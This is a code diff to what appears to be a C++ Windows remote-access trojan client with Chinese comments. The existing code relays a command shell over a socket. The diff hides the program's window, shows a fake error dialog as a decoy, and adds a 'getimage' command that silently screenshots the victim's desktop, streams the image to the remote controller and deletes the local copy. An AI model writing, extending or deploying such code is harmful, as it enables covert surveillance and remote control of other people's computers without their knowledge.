@@ -5,11 +5,16 @@
 #include<windows.h>
 #include<thread>
 #include<process.h>
+#include <atlimage.h>
+#include <fstream>
+#include <atltime.h>
 #include<tchar.h>
 using namespace std;
 #pragma comment(lib, "ws2_32.lib")
+#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")//不显示窗口
 
-
+#define MAX_SIZE 10
+#define ONE_PAGE 1024
 HANDLE hStdInRead, hStdInWrite;
 HANDLE hStdOutRead, hStdOutWrite;
 
@@ -17,6 +22,41 @@ SECURITY_ATTRIBUTES saIn, saOut;
 
 //SOCKET clientSocket;
 SOCKET sclient;
+
+
+CString ScreenShot()
+{
+	HDC hDCScreen = ::GetDC(NULL);//首先获取到屏幕的句柄    
+	int nBitPerPixel = GetDeviceCaps(hDCScreen, BITSPIXEL);//获取到每个像素的bit数目
+	int nWidthScreen = GetDeviceCaps(hDCScreen, HORZRES);
+	int nHeightScreen = GetDeviceCaps(hDCScreen, VERTRES);
+	//创建一个CImage的对象
+	CImage m_MyImage;
+	//Create实例化CImage，使得其内部的画布大小与屏幕一致
+	m_MyImage.Create(nWidthScreen, nHeightScreen, nBitPerPixel);
+	//获取到CImage的 HDC,但是需要手动ReleaseDC操作,下面是MSDN的说明
+	//Because only one bitmap can be selected into a device context at a time, 
+	//you must call ReleaseDC for each call to GetDC.
+	HDC hDCImg = m_MyImage.GetDC();
+	//使用bitblt 将屏幕的DC画布上的内容 拷贝到CImage上
+	BitBlt(hDCImg, 0, 0, nWidthScreen, nHeightScreen, hDCScreen, 0, 0, SRCCOPY);
+
+	//保存到的文件名
+	CString strFileName("./");
+	//CreateDirectory((LPCTSTR)strFileName, NULL);
+	//CTime t = CTime::GetCurrentTime();
+	//CString tt = t.Format(_T("%Y-%m-%d_%H-%M-%S"));
+	strFileName += "newImage";
+	strFileName += _T(".PNG");
+
+	//直接保存吧
+	m_MyImage.Save(strFileName, Gdiplus::ImageFormatPNG);
+
+	//前面调用了GetDC所以需要调用ReleaseDC释放掉
+	//详情请参见MSDN
+	m_MyImage.ReleaseDC();
+	return strFileName;
+}
 
 
 
@@ -68,6 +108,7 @@ void ReadOutPutReadCmd(LPVOID lPvoid)
 	
 	while (1)
 	{
+		cout << "写入设备？" << endl;
 		memset(Buf, 0, sizeof(Buf));
 		PeekNamedPipe(hStdOutRead, Buf, 1024, &dwByteRecv, 0, 0);
 		if (dwByteRecv)
@@ -80,6 +121,7 @@ void ReadOutPutReadCmd(LPVOID lPvoid)
 			if (ret <= 0)
 				break;
 		}
+		Sleep(100);
 	}
 
 }
@@ -87,6 +129,9 @@ void ReadOutPutReadCmd(LPVOID lPvoid)
 
 int main()
 {
+
+	MessageBox(NULL, "错误! (Error code: -5)", "警告", 0 | MB_ICONSTOP);
+
 	WORD sockVersion = MAKEWORD(2, 2);
 	WSADATA data;
 	if (WSAStartup(sockVersion, &data) != 0)
@@ -160,7 +205,7 @@ int main()
 						break;
 					}
 					Buf[ret] = '\0';
-					if (!strcmp(Buf, "ES"))	//比较
+					if (!strcmp(Buf, "ES"))	//比较是否退出shell
 					{
 						cout << "退出shell循环" << endl;
 						break;	//退出shell循环
@@ -172,19 +217,51 @@ int main()
 						continue;
 					}
 					
-					//cout << "1" << endl;
 					Buf[ret] = '\r';
 					Buf[ret + 1] = '\n';
 					Buf[ret + 2] = 0;
 					//cout << "2" << endl;
-					printf("recv: %s", Buf);
+					//printf("recv: %s", Buf);
 					dwByteRecv = ret;
 					ret = WriteFile(hStdInWrite, Buf, dwByteRecv + 2, &dwByteRecv, 0);
+					cout << "写入管道,内容["<<Buf<<"]" << endl;
 					if (!ret)
 					{
 						break;
 					}
 				}
+			}else if (!strcmp(recData, "getimage"))
+			{
+				char szBuf[ONE_PAGE] = { 0 };
+				ScreenShot();
+				Sleep(100);
+				send(sclient, "11", strlen("11"), 0);
+				Sleep(100);
+				char path[] = "./newImage.png";
+				fstream fs;
+				fs.open(path, fstream::in | fstream::binary);
+				fs.seekg(0, fstream::end);//以最后的位置为基准不偏移
+				int nlen = fs.tellg();//取得文件大小
+				cout << "大小: " << nlen << endl;
+				fs.seekg(0, fstream::beg);
+				sprintf(szBuf, "%d", nlen);
+				send(sclient, szBuf, strlen(szBuf), 0);
+				Sleep(10);
+
+				while (!fs.eof())
+				{
+					cout << "1" << endl;
+					fs.read(szBuf, ONE_PAGE);
+					cout << "2" << endl;
+					int len = fs.gcount();
+					cout << "3" << endl;
+					send(sclient, szBuf, len, 0);
+					cout << "发送" << endl;
+				}
+				fs.close();
+				cout << "结束" << endl;
+				Sleep(1000);
+				DeleteFile("./newImage.png");
 			}
 
 		}
@@ -196,5 +273,3 @@ int main()
 	return 0;
 
 }
-
-
